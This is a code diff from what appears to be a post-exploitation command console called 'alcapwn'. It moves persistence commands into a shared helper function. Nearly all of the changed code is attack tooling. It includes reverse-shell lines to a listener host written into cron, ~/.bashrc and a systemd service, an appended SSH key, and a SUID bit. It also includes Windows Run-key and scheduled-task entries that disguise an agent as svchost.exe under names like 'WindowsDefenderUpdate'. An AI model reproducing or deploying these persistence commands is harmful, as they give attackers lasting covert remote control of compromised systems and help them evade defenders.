@@ -10,6 +10,51 @@ import (
 	"alcapwn/proto"
 )
 
+// persistTemplate returns the shell command and human-readable message for a
+// given persistence method. host and port are substituted into the template
+// (use literal placeholders like "HOST"/"PORT" for the create-profile path).
+// Returns empty strings and false if method is unknown.
+func persistTemplate(method, host, port string) (cmd, msg string, ok bool) {
+	switch method {
+	case "cron":
+		cmd = fmt.Sprintf(`echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1'" >> /etc/cron.d/alcapwn`, host, port)
+		msg = "Cron persistence installed (runs every 5 minutes)"
+	case "bashrc":
+		cmd = fmt.Sprintf(`echo "bash -i >& /dev/tcp/%s/%s 0>&1 &" >> ~/.bashrc`, host, port)
+		msg = "Bashrc persistence installed (runs on new shell)"
+	case "sshkey":
+		cmd = `echo "ssh-rsa <PUBKEY> alcapwn" >> ~/.ssh/authorized_keys`
+		msg = "SSH key persistence installed (requires manual key setup)"
+	case "systemd":
+		cmd = fmt.Sprintf(`echo "[Unit]
+Description=Alcapwn Persistence
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1'
+Restart=always
+
+[Install]
+WantedBy=multi-user.target" > /etc/systemd/system/alcapwn.service && systemctl enable alcapwn`, host, port)
+		msg = "Systemd persistence installed (requires root)"
+	case "setuid":
+		cmd = `chmod u+s /path/to/binary`
+		msg = "SUID bit set (requires SUID binary upload first)"
+	case "reg":
+		agentPath := `%APPDATA%\svchost.exe`
+		cmd = fmt.Sprintf(`reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdate /t REG_SZ /d "%s" /f`, agentPath)
+		msg = fmt.Sprintf("Registry Run key set (HKCU). Agent should be placed at %s before reboot.", agentPath)
+	case "schtask":
+		agentPath := `%APPDATA%\svchost.exe`
+		cmd = fmt.Sprintf(`schtasks /create /tn "WindowsDefenderUpdate" /tr "%s" /sc onlogon /f`, agentPath)
+		msg = fmt.Sprintf("Scheduled task created (on logon). Agent should be placed at %s.", agentPath)
+	default:
+		return "", "", false
+	}
+	return cmd, msg, true
+}
+
 // cmdLabels manages session labels
 // Usage: labels <id> <label1> [label2...] - Add labels to session
 //
@@ -284,14 +329,8 @@ func (c *Console) cmdPersist(args []string) {
 	}
 
 	sess.mu.Lock()
-	if sess.State == SessionStateInteractive {
+	if !checkBackgrounded(sess) {
 		sess.mu.Unlock()
-		fmt.Printf("[!] Session %d is currently active — background it first.\n", id)
-		return
-	}
-	if sess.State == SessionStateTerminated {
-		sess.mu.Unlock()
-		fmt.Printf("[!] Session %d has been terminated.\n", id)
 		return
 	}
 	isAgent := sess.IsAgent
@@ -335,46 +374,8 @@ func (c *Console) cmdPersist(args []string) {
 		listenPort = p
 	}
 
-	var cmd string
-	var msg string
-
-	switch method {
-	case "cron":
-		cmd = fmt.Sprintf(`echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1'" >> /etc/cron.d/alcapwn`, listenHost, listenPort)
-		msg = "Cron persistence installed (runs every 5 minutes)"
-	case "bashrc":
-		cmd = fmt.Sprintf(`echo "bash -i >& /dev/tcp/%s/%s 0>&1 &" >> ~/.bashrc`, listenHost, listenPort)
-		msg = "Bashrc persistence installed (runs on new shell)"
-	case "sshkey":
-		cmd = `echo "ssh-rsa <PUBKEY> alcapwn" >> ~/.ssh/authorized_keys`
-		msg = "SSH key persistence installed (requires manual key setup)"
-	case "systemd":
-		cmd = fmt.Sprintf(`echo "[Unit]
-Description=Alcapwn Persistence
-After=network.target
-
-[Service]
-Type=simple
-ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1'
-Restart=always
-
-[Install]
-WantedBy=multi-user.target" > /etc/systemd/system/alcapwn.service && systemctl enable alcapwn`, listenHost, listenPort)
-		msg = "Systemd persistence installed (requires root)"
-	case "setuid":
-		cmd = `chmod u+s /path/to/binary`
-		msg = "SUID bit set (requires SUID binary upload first)"
-	case "reg":
-		// Windows: HKCU Run key — no elevation needed.
-		agentPath := `%APPDATA%\svchost.exe`
-		cmd = fmt.Sprintf(`reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdate /t REG_SZ /d "%s" /f`, agentPath)
-		msg = fmt.Sprintf("Registry Run key set (HKCU). Agent should be placed at %s before reboot.", agentPath)
-	case "schtask":
-		// Windows: scheduled task — runs on logon, no elevation needed for HKCU task.
-		agentPath := `%APPDATA%\svchost.exe`
-		cmd = fmt.Sprintf(`schtasks /create /tn "WindowsDefenderUpdate" /tr "%s" /sc onlogon /f`, agentPath)
-		msg = fmt.Sprintf("Scheduled task created (on logon). Agent should be placed at %s.", agentPath)
-	default:
+	cmd, msg, ok := persistTemplate(method, listenHost, listenPort)
+	if !ok {
 		fmt.Println("[!] Unknown method.")
 		fmt.Println("    Linux methods:   cron, bashrc, sshkey, systemd, setuid")
 		fmt.Println("    Windows methods: reg, schtask")
@@ -539,48 +540,9 @@ func (c *Console) cmdPersistCreate(args []string) {
 	name := args[0]
 	method := strings.ToLower(args[1])
 
-	var cmd string
-	var msg string
-	var placeholderHost string
-	var placeholderPort string
-
-	switch method {
-	case "cron":
-		cmd = `echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/HOST/PORT 0>&1'" >> /etc/cron.d/alcapwn`
-		msg = "Cron persistence installed (runs every 5 minutes)"
-		placeholderHost = "YOUR_LISTENER_IP"
-		placeholderPort = "YOUR_LISTENER_PORT"
-	case "bashrc":
-		cmd = `echo "bash -i >& /dev/tcp/HOST/PORT 0>&1 &" >> ~/.bashrc`
-		msg = "Bashrc persistence installed (runs on new shell)"
-		placeholderHost = "YOUR_LISTENER_IP"
-		placeholderPort = "YOUR_LISTENER_PORT"
-	case "sshkey":
-		cmd = `echo "ssh-rsa <PUBKEY> alcapwn" >> ~/.ssh/authorized_keys`
-		msg = "SSH key persistence installed (requires manual key setup)"
-		placeholderHost = "N/A"
-		placeholderPort = "N/A"
-	case "systemd":
-		cmd = `echo "[Unit]
-Description=Alcapwn Persistence
-After=network.target
-
-[Service]
-Type=simple
-ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/HOST/PORT 0>&1'
-Restart=always
-
-[Install]
-WantedBy=multi-user.target" > /etc/systemd/system/alcapwn.service && systemctl enable alcapwn`
-		msg = "Systemd persistence installed (requires root)"
-		placeholderHost = "YOUR_LISTENER_IP"
-		placeholderPort = "YOUR_LISTENER_PORT"
-	case "setuid":
-		cmd = `chmod u+s /path/to/binary`
-		msg = "SUID bit set (requires SUID binary upload first)"
-		placeholderHost = "N/A"
-		placeholderPort = "N/A"
-	default:
+	// Use literal "HOST"/"PORT" as placeholders in the template.
+	cmd, msg, ok := persistTemplate(method, "HOST", "PORT")
+	if !ok {
 		fmt.Println("[!] Unknown method. Use: cron, bashrc, sshkey, systemd, setuid")
 		return
 	}
@@ -608,7 +570,11 @@ WantedBy=multi-user.target" > /etc/systemd/system/alcapwn.service && systemctl e
 	fmt.Printf("[*] Persistence profile '%s' created: %s\n", name, profile.ID)
 	fmt.Printf("[*] Command template:\n  %s\n", cmd)
 	fmt.Printf("[*] %s\n", msg)
-	fmt.Printf("[*] Replace HOST with %s and PORT with %s\n", placeholderHost, placeholderPort)
+	// Network-based methods need host/port substitution.
+	needsHostPort := method != "sshkey" && method != "setuid"
+	if needsHostPort {
+		fmt.Println("[*] Replace HOST with YOUR_LISTENER_IP and PORT with YOUR_LISTENER_PORT")
+	}
 	fmt.Println("[*] Note: Use 'persist assign' to add sessions to this profile")
 }
 
